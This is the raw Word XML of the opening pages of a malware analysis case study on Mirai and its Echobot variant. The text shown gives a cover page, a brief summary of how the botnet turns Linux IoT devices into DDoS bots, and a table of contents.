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22A8B" w14:textId="6BAD94A5" w:rsidR="000C7198" w:rsidRDefault="005D1A12" w:rsidP="00751C3F">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:sectPr w:rsidR="000C7198" w:rsidSect="00CF235F">
          <w:footerReference w:type="default" r:id="rId11"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="0" w:right="0" w:bottom="0" w:left="0" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES" w:eastAsia="es-ES"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4B1A1CA3" wp14:editId="35EE5F8E">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>right</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="7772400" cy="10029825"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapThrough wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21579"/>
                <wp:lineTo x="21547" y="21579"/>
                <wp:lineTo x="21547" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapThrough>
            <wp:docPr id="10" name="Imagen 1" descr="D:\servicios forobeta posts\diseño grafico\CLIENTES\Feelmusic - 29.10.18\archivos\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s forobeta posts\diseño grafico\CLIENTES\Feelmusic - 29.10.18\archivos\12\12.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1002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7ECC">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="es-ES" w:eastAsia="es-ES"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2DFEC6D6" wp14:editId="130E32E9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2305050</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3035300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4660900" cy="692150"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapThrough wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="265" y="0"/>
                    <wp:lineTo x="265" y="20807"/>
                    <wp:lineTo x="21276" y="20807"/>
                    <wp:lineTo x="21276" y="0"/>
                    <wp:lineTo x="265" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapThrough>
                <wp:docPr id="3" name="Delivered By"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4660900" cy="69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EC6D6" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="Delivered By" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;margin-left:181.5pt;margin-top:239pt;width:367pt;height:5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" filled="f" stroked="f" strokeweight=".5pt">
                <v:textbo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3360" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="14E716CB" wp14:editId="4C030584">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2298700</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3479800</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4946650" cy="1397000"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapThrough wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="250" y="0"/>
                    <wp:lineTo x="250" y="21207"/>
                    <wp:lineTo x="21295" y="21207"/>
                    <wp:lineTo x="21295" y="0"/>
                    <wp:lineTo x="250" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapThrough>
                <wp:docPr id="5" name="Report Title"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="494665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Case Study – Mirai/Echobot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16CB" id="Report Title" o:spid="_x0000_s1027" type="#_x0000_t202" style="position:absolute;margin-left:181pt;margin-top:274pt;width:389.5pt;height:1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" filled="f" stroked="f" strokeweight=".5pt">
                <v:textbo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Case Study – Mirai/Echobot</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4384" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="52D099CC" wp14:editId="625E34BF">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2533650</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>5110480</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4803775" cy="1623695"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapThrough wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="257" y="0"/>
                    <wp:lineTo x="257" y="21287"/>
                    <wp:lineTo x="21329" y="21287"/>
                    <wp:lineTo x="21329" y="0"/>
                    <wp:lineTo x="257" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapThrough>
                <wp:docPr id="6" name="Intro To Report"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4803775" cy="162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099CC" id="Intro To Report" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;margin-left:199.5pt;margin-top:402.4pt;width:378.25pt;height:127.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" filled="f" stroked="f" strokeweight=".5pt">
                <v:textbo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v:textbox>
                <w10:wrap type="through"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5035AF" w14:textId="127070B2" w:rsidR="00421C0E" w:rsidRDefault="00421C0E" w:rsidP="00421C0E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc101284328"/>
      <w:r w:rsidRPr="00421C0E">
        <w:lastRenderedPageBreak/>
        <w:t>Exclusive Summary</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="1B7C1613" w14:textId="78A7A633" w:rsidR="00BF6A60" w:rsidRDefault="00EB0794" w:rsidP="000E78BF">
      <w:r>
        <w:t>Mirai is a malware that was discovered by MalwareMustDie – a malware research group in August 2016.</w:t>
      </w:r>
      <w:r w:rsidR="00FA1067">
        <w:t xml:space="preserve"> The malware </w:t>
      </w:r>
      <w:r w:rsidR="00BD416A">
        <w:t>infects</w:t>
      </w:r>
      <w:r w:rsidR="00FA1067">
        <w:t xml:space="preserve"> devices running </w:t>
      </w:r>
      <w:r w:rsidR="00EB3DAD">
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidR="00FA1067">
        <w:t xml:space="preserve"> such as routers, firewalls, cameras</w:t>
      </w:r>
      <w:r w:rsidR="00323367">
        <w:t>, servers</w:t>
      </w:r>
      <w:r w:rsidR="000A66F3">
        <w:t xml:space="preserve"> and other smart home IoT devices,</w:t>
      </w:r>
      <w:r w:rsidR="00FA1067">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000A66F3">
        <w:t>transforming</w:t>
      </w:r>
      <w:r w:rsidR="00FA1067">
        <w:t xml:space="preserve"> them into remotely controlled bots that can be used by the attacker </w:t>
      </w:r>
      <w:r w:rsidR="008A63DA">
        <w:t>to simulate large DDoS attacks</w:t>
      </w:r>
      <w:r w:rsidR="004B584C">
        <w:t xml:space="preserve"> to targeted domains</w:t>
      </w:r>
      <w:r w:rsidR="008A63DA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD416A">
        <w:t>in order to disrupt services and platforms</w:t>
      </w:r>
      <w:r w:rsidR="008A63DA">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5529A3CF" w14:textId="09683123" w:rsidR="00074A3D" w:rsidRDefault="00074A3D" w:rsidP="000E78BF">
      <w:r>
        <w:t xml:space="preserve">This malware analysis </w:t>
      </w:r>
      <w:r w:rsidR="003B5771">
        <w:t>case study</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will go over a Mirai variant called ‘Echobot’ that was discovered</w:t>
      </w:r>
      <w:r w:rsidR="003868E2">
        <w:t xml:space="preserve"> by Palto Alto Network Researchers in June </w:t>
      </w:r>
      <w:r w:rsidR="003B5771">
        <w:t>2019</w:t>
      </w:r>
      <w:r w:rsidR="00F25E0D">
        <w:t>. We will go over the capabilities of the malware from our own analysis and at the end of the case study provide recommendations for mitigating and preventing the malware from spreading.</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:caps w:val="0"/>
          <w:color w:val="auto"/>
          <w:spacing w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:id w:val="1412508720"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="7A07E502" w14:textId="2B83C6D2" w:rsidR="000E78BF" w:rsidRDefault="000E78BF">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Table of Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="170F6BD8" w14:textId="5BFC1BFD" w:rsidR="00BA63CA" w:rsidRDefault="000E78BF">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc101284328" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exclusive Summary</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284328 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="45A8FFC8" w14:textId="61EB1E1D" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284329" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Mitre Att&amp;ck Matrix</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284329 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7F696BFA" w14:textId="5E9B70DA" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284330" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Threat intel insights</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284330 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A604B3D" w14:textId="771BFD77" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284331" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Targets</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284331 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2B33088D" w14:textId="4B949FDB" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284332" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Technical Analysis</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284332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5FDBD533" w14:textId="71EF8B30" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284333" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Main Malware Sample</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284333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0F8EE66A" w14:textId="2D1EAC3A" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284334" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploits/Vunlerabilities</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284334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782A1EA9" w14:textId="44FFBCE7" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284335" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Reconnaisance</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284335 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="02E73568" w14:textId="306B3DB2" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284336" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Defense Evasion</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284336 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7AF87B91" w14:textId="3DF2482F" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284337" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Mirai DdoS Functionality</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc101284337 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="29A97100" w14:textId="63E4A3B9" w:rsidR="00BA63CA" w:rsidRDefault="00000000">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-AU" w:eastAsia="en-AU"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc101284338" w:history="1">
            <w:r w:rsidR="00BA63CA" w:rsidRPr="00A3424E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Command &amp; Control (C&amp;C)</w:t>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00BA63CA">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
